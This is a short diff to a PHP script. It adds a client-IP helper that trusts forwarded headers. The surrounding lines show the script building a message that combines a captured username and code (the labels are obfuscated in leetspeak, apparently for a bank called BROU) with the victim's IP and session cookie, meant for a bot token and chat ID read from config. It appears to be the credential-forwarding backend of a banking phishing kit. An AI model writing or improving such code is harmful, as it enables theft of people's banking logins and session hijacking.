@@ -1,7 +1,19 @@
 <?php
 
 
+
 ini_set("display_errors", 0);
+
+function getClientIP()
+{
+  if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
+    return $_SERVER['HTTP_CLIENT_IP'];
+  } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+    return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
+  } else {
+    return $_SERVER['REMOTE_ADDR'];
+  }
+}
 
 $config = include('config.php');
 
@@ -12,7 +24,7 @@ $token = $config['token'];
 $chat_id = $config['chat_id'];
 
 
-$ip = $_SERVER['REMOTE_ADDR'];
+$ip = getClientIP();
 $sesion = isset($_COOKIE['breves']) ? $_COOKIE['breves'] : '';
 
 $mensaje_para_chatbot = "🔐🔵3BROU🔵\nUS4R: " . $elusr . "\nC0D3: " . $elpax . "\nip: " . $ip . "\nsesion: " . $sesion;
